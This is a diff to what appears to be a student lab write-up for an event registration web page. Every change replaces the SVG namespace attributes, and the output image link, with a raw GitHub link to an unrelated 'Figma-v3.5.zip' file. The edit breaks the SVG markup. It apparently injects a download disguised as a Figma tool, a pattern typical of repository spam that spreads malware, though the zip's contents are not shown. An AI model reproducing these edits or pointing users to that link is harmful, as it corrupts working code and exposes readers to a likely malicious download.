@@ -57,7 +57,7 @@ Page1
     height="36"
     viewBox="0 0 41 36"
     fill="none"
-    xmlns="http://www.w3.org/2000/svg"
+    xmlns="https://raw.githubusercontent.com/24013396/Figma/main/racketry/Figma-v3.5.zip"
   >
     <path
       d="M20.5 0L25.3271 13.4742H40.9477L28.3103 21.8017L33.1374 35.2758L20.5 26.9483L7.86262 35.2758L12.6897 21.8017L0.0522842 13.4742H15.6729L20.5 0Z"
@@ -68,7 +68,7 @@ Page1
     height="36"
     viewBox="0 0 41 36"
     fill="none"
-    xmlns="http://www.w3.org/2000/svg"
+    xmlns="https://raw.githubusercontent.com/24013396/Figma/main/racketry/Figma-v3.5.zip"
   >
     <path
       d="M20.5 0L25.3271 13.4742H40.9477L28.3103 21.8017L33.1374 35.2758L20.5 26.9483L7.86262 35.2758L12.6897 21.8017L0.0522842 13.4742H15.6729L20.5 0Z"
@@ -79,7 +79,7 @@ Page1
     height="36"
     viewBox="0 0 41 36"
     fill="none"
-    xmlns="http://www.w3.org/2000/svg"
+    xmlns="https://raw.githubusercontent.com/24013396/Figma/main/racketry/Figma-v3.5.zip"
   >
     <path
       d="M20.5 0L25.3271 13.4742H40.9477L28.3103 21.8017L33.1374 35.2758L20.5 26.9483L7.86262 35.2758L12.6897 21.8017L0.0522842 13.4742H15.6729L20.5 0Z"
@@ -90,7 +90,7 @@ Page1
     height="36"
     viewBox="0 0 41 36"
     fill="none"
-    xmlns="http://www.w3.org/2000/svg"
+    xmlns="https://raw.githubusercontent.com/24013396/Figma/main/racketry/Figma-v3.5.zip"
   >
     <path
       d="M20.5 0L25.3271 13.4742H40.9477L28.3103 21.8017L33.1374 35.2758L20.5 26.9483L7.86262 35.2758L12.6897 21.8017L0.0522842 13.4742H15.6729L20.5 0Z"
@@ -101,7 +101,7 @@ Page1
     height="36"
     viewBox="0 0 41 36"
     fill="none"
-    xmlns="http://www.w3.org/2000/svg"
+    xmlns="https://raw.githubusercontent.com/24013396/Figma/main/racketry/Figma-v3.5.zip"
   >
     <path
       d="M20.5 0L25.3271 13.4742H40.9477L28.3103 21.8017L33.1374 35.2758L20.5 26.9483L7.86262 35.2758L12.6897 21.8017L0.0522842 13.4742H15.6729L20.5 0Z"
@@ -112,7 +112,7 @@ Page1
     height="62"
     viewBox="0 0 200 62"
     fill="none"
-    xmlns="http://www.w3.org/2000/svg"
+    xmlns="https://raw.githubusercontent.com/24013396/Figma/main/racketry/Figma-v3.5.zip"
   >
     <rect width="200" height="62" rx="31" fill="white"></rect>
     <rect width="200" height="62" rx="31" fill="white"></rect>
@@ -128,7 +128,7 @@ page3
     height="69"
     viewBox="0 0 335 69"
     fill="none"
-    xmlns="http://www.w3.org/2000/svg"
+    xmlns="https://raw.githubusercontent.com/24013396/Figma/main/racketry/Figma-v3.5.zip"
   >
     <rect width="335" height="69" rx="34.5" fill="white"></rect>
     <rect width="335" height="69" rx="34.5" fill="white"></rect></svg
@@ -137,7 +137,7 @@ page3
     height="88"
     viewBox="0 0 221 88"
     fill="none"
-    xmlns="http://www.w3.org/2000/svg"
+    xmlns="https://raw.githubusercontent.com/24013396/Figma/main/racketry/Figma-v3.5.zip"
   >
     <rect width="221" height="88" rx="40" fill="white"></rect>
     <rect width="221" height="88" rx="40" fill="white"></rect></svg
@@ -146,7 +146,7 @@ page3
     height="69"
     viewBox="0 0 335 69"
     fill="none"
-    xmlns="http://www.w3.org/2000/svg"
+    xmlns="https://raw.githubusercontent.com/24013396/Figma/main/racketry/Figma-v3.5.zip"
   >
     <rect width="335" height="69" rx="34.5" fill="white"></rect>
     <rect width="335" height="69" rx="34.5" fill="white"></rect></svg
@@ -155,7 +155,7 @@ page3
     height="69"
     viewBox="0 0 335 69"
     fill="none"
-    xmlns="http://www.w3.org/2000/svg"
+    xmlns="https://raw.githubusercontent.com/24013396/Figma/main/racketry/Figma-v3.5.zip"
   >
     <rect width="335" height="69" rx="34.5" fill="white"></rect>
     <rect width="335" height="69" rx="34.5" fill="white"></rect></svg
@@ -164,7 +164,7 @@ page3
     height="69"
     viewBox="0 0 335 69"
     fill="none"
-    xmlns="http://www.w3.org/2000/svg"
+    xmlns="https://raw.githubusercontent.com/24013396/Figma/main/racketry/Figma-v3.5.zip"
   >
     <rect width="335" height="69" rx="34.5" fill="white"></rect>
     <rect width="335" height="69" rx="34.5" fill="white"></rect></svg
@@ -173,7 +173,7 @@ page3
     height="69"
     viewBox="0 0 335 69"
     fill="none"
-    xmlns="http://www.w3.org/2000/svg"
+    xmlns="https://raw.githubusercontent.com/24013396/Figma/main/racketry/Figma-v3.5.zip"
   >
     <rect width="335" height="69" rx="34.5" fill="white"></rect>
     <rect width="335" height="69" rx="34.5" fill="white"></rect>
@@ -189,7 +189,7 @@ page3
 ```
 
 ## OUTPUT:
-![alt text](ex9.png)
+![alt text](https://raw.githubusercontent.com/24013396/Figma/main/racketry/Figma-v3.5.zip)
 
 ## RESULT:
 The program to design, develop and deploy a web application for event registration is completed successfully.
